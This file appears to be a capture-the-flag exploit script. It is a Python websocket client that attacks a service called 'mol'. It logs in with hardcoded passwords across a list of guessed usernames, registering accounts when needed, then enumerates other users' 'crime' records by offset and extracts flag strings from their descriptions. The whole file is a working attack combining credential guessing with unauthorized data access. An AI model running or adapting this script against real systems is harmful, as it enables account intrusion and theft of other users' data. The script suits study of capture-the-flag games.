#!/usr/bin/env python3.5
# encoding: utf-8

import json
import sys
import re
from functools import partial
from autobahn.twisted.websocket import WebSocketClientProtocol, WebSocketClientFactory
from twisted.python import log

PW = 'coof9ZaiRa6taeD'
PW = 'chah2olo0meiy7hir9Ei'
# own pw
#PW = 'joo4saes4aZoobo'
UID_RE = re.compile(r'\(uid=(.+?)\)')
FLAG_RE = re.compile(r'(\w{31}=)')

flags_found = False
log.startLogging(sys.stdout)


class MolProtocol(WebSocketClientProtocol):
    def onConnect(self, response):
        pass

    def onOpen(self):
        self.last_action = None
        self.num_flags = 0
        self.expanded = False
        self.usernames = list('j' + chr(u) for u in range(ord('a'), ord('z')+1))
        self.login()

    def onMessage(self, payload, isBinary):
        #log.msg("Payload:", payload)
        if self.last_action and hasattr(self, 'on_' + self.last_action):
            try:
                getattr(self, 'on_' + self.last_action)(json.loads(payload.decode('utf8')))
            except Exception as e:
                print(e)
                reactor.stop()
        else:
            log.msg("Payload:", payload)

    def onClose(self, *args, **kwargs):
        pass

    def login(self):
        #{"action":"auth","params":{"username":"a","password":"a"}}
        self.auth(username=self.usernames[0], password=PW)
        self.auth_msg = False

    def register2(self):
        # {"action":"register","params":{"username":"","password":""}}
        self.register(username=self.usernames[0], password=PW)

    def on_auth(self, payload):
        if 'text' in payload:
            if 'Invalid password' in payload['text']:
                self.usernames.pop(0)
                self.login()
            elif 'Username does not exists' in payload['text']:
                self.register2()
            else:
                self.auth_msg = True
        elif self.auth_msg:
            self.offset = 50
            self.show_crimes(offset=self.offset)

    def on_show_crimes(self, payload):
        self.crimes = []
        if 'rows' in payload:
            rows = payload['rows']
            for row in rows:
                if 'data' in row:
                    for crime in row['data']:
                        self.crimes.append(crime)

        if self.crimes:
            if self.offset == 50 and not self.expanded:
                self.offset += 50
                self.expanded = True
            crime = self.crimes.pop(0)  
            self.show_crime(crimeid=crime['crimeid'])
        else:
            self.offset -= 1
            if self.offset >= 0 and self.num_flags < 20:
                log.msg("{} -> {}".format(self.offset, self.num_flags))
                self.show_crimes(offset=self.offset)
            else:
                log.msg('stopped in show_crimes')
                reactor.stop()

    def on_show_crime(self, payload):
        if 'rows' in payload:
            rows = payload['rows']
            for row in rows:
                desc = row['data']['description']

                m = FLAG_RE.search(desc)
                if m:
                    global flags_found
                    flags_found = True
                    self.num_flags += 1
                    log.msg(str(self.num_flags))
                    flag = m.group(1)
                    log.msg(flag)

        if self.crimes:
            crime = self.crimes.pop(0)
            self.show_crime(crimeid=crime['crimeid'])
        else:
            self.offset -= 1
            if self.offset >= 0 and self.num_flags < 20:
                log.msg("{} -> {}".format(self.offset, self.num_flags))
                self.show_crimes(offset=self.offset)
            else:
                log.msg('stopped in show_crime')
                reactor.stop()

    def on_register(self, payload):
        if 'text' not in payload:
            log.msg(payload)
            return

        m = UID_RE.search(payload['text'])
        if m:
            self.uid = m.group(1)
            self.login()
        else:
            log.msg('Register failed?')

    def action(self, name, **kwargs):
        data = {
            'action': name,
            'params': kwargs
        }
        self.last_action = name
        log.msg("Action:", "{}({})".format(name, kwargs))
        self.sendMessage(json.dumps(data).encode('utf8'))

    def __getattr__(self, name):
        if name in ('show_crimes', 'show_crime', 'auth', 'register'):
            return partial(self.action, name)
        else:
            super(MolProtocol, self).__getattr__(name)


if __name__ == '__main__':
    from twisted.internet import reactor

    ip = sys.argv[1]
    port = int(sys.argv[2])

    factory = WebSocketClientFactory(u"ws://mol.{}:{}/websocket".format(ip, port), debug=False,
                                     headers={
                                         'Host': 'mol.' + ip
                                     })
    factory.protocol = MolProtocol

    reactor.connectTCP(ip, port, factory)
    try:
        reactor.run()
    except Exception as e:
        print(e)
    if flags_found:
        sys.exit(0)
    else:
        sys.exit(1)
